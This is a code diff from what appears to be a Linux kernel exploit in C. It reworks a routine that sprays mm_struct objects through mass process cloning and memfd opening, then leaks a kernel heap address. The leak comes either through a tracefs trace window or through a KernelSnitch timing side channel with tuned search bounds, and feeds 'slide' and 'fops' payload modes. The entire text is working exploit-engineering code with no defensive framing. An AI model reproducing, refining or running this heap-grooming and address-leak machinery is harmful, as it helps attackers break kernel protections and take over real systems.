@@ -2055,6 +2055,45 @@ static void cleanup_failed_kernel_page(const char *reason) {
 }
 #endif
 
+#if !defined(APP_CONTROLLED_MM_GROUP_RECLAIM) || \
+    !APP_CONTROLLED_MM_GROUP_RECLAIM
+static void setup_kernel_page_kernelsnitch(int payload_mode, int cpu_count) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
+  size_t search_max_object_index = mm_objs_per_slab - 1;
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
+    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
+  }
+  kernelsnitch_set_search_bounds(
+      ks, KERNELSNITCH_IDENTITY_START,
+      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      search_min_object_index, search_max_object_index,
+      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
+#endif
+  configure_kernelsnitch_profile(ks, payload_mode);
+#else
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    kernelsnitch_set_profile(
+        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+        SLIDE_KSNITCH_AVERAGE);
+  }
+#endif
+#endif
+}
+#endif
+
 uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
@@ -2073,16 +2112,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
+  int trace_window = 0;
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-  int tracefs_mm_armed = tracefs_mm_start();
+  trace_window = tracefs_mm_available();
+  if (trace_window) {
+    trace_window = tracefs_mm_start();
+  }
 #endif
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
-#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-    if (tracefs_mm_armed && (i + 1) % 128 == 0) {
-      tracefs_mm_drain();
-    }
-#endif
   }
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
@@ -2092,10 +2130,34 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t leaked = 0;
+  uintptr_t base = 0;
+  int mm_leaked_ready = 0;
+
+  if (!trace_window) {
+    setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
+  }
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    pre_ctx.childs[i] = clone_child();
+  }
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-  uintptr_t tracefs_mm_leaked = 0;
-  int tracefs_mm_ok = 0;
-  if (tracefs_mm_armed) {
+  if (trace_window) {
+    child_leak = tracefs_mm_clone_hold();
+  } else
+#endif
+  {
+    child_leak = clone_leak_child();
+  }
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    post_ctx.childs[i] = clone_child();
+  }
+#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
+  if (trace_window) {
     size_t mm_min_index = APP_SLIDE_MIN_OBJECT_INDEX;
     size_t mm_max_index = APP_SLIDE_MAX_OBJECT_INDEX;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(APP_FOPS_MIN_OBJECT_INDEX)
@@ -2108,73 +2170,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     }
 #endif
-    tracefs_mm_ok = tracefs_mm_finish(&tracefs_mm_leaked, mm_min_index,
-                                      mm_max_index);
-    pr_success("mm trace leak ok=%d leaked=%016zx\n", tracefs_mm_ok,
-               tracefs_mm_leaked);
-  } else {
-    pr_info("mm trace unavailable; falling back to KernelSnitch\n");
-  }
-#endif
-#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
-  touch_mm_slabinfo();
-#endif
-
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  uintptr_t leaked = 0;
-  uintptr_t base = 0;
-  int mm_leaked_ready = 0;
-#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-  if (tracefs_mm_ok) {
-    leaked = tracefs_mm_leaked;
-    mm_leaked_ready = 1;
-  }
-#endif
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  if (!mm_leaked_ready) {
-    ks = kernelsnitch_setup(
-        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
-        KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
-    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
-    size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
-    size_t search_max_object_index = mm_objs_per_slab - 1;
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
-      search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
+    if (tracefs_mm_finish(&leaked, pre_ctx.mm_cnt, mm_min_index,
+                          mm_max_index)) {
+      mm_leaked_ready = 1;
+      pr_success("mm trace leak leaked=%016zx\n", leaked);
+    } else {
+      if (child_leak > 0) {
+        tracefs_mm_release_child();
+        SYSCHK(waitpid(child_leak, NULL, 0));
+      }
+      child_leak = -1;
+      pr_info("mm trace leak missing; using KernelSnitch\n");
+      setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
+      child_leak = clone_leak_child();
     }
-    kernelsnitch_set_search_bounds(
-        ks, KERNELSNITCH_IDENTITY_START,
-        APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
-        search_min_object_index, search_max_object_index,
-        APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
-#endif
-    configure_kernelsnitch_profile(ks, payload_mode);
-  }
-#else
-  if (!mm_leaked_ready) {
-    ks = kernelsnitch_setup(
-        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      kernelsnitch_set_profile(
-          ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-          SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-          SLIDE_KSNITCH_AVERAGE);
-    }
-#endif
   }
 #endif
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.childs[i] = clone_child();
-  }
-  child_leak = clone_leak_child();
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.childs[i] = clone_child();
-  }
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
@@ -2199,7 +2210,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
     spray_ctx.childs[i] = -1;
   }
-  SYSCHK(waitpid(child_leak, NULL, 0));
+  if (child_leak > 0) {
+#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
+    tracefs_mm_release_child();
+#endif
+    SYSCHK(waitpid(child_leak, NULL, 0));
+  }
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
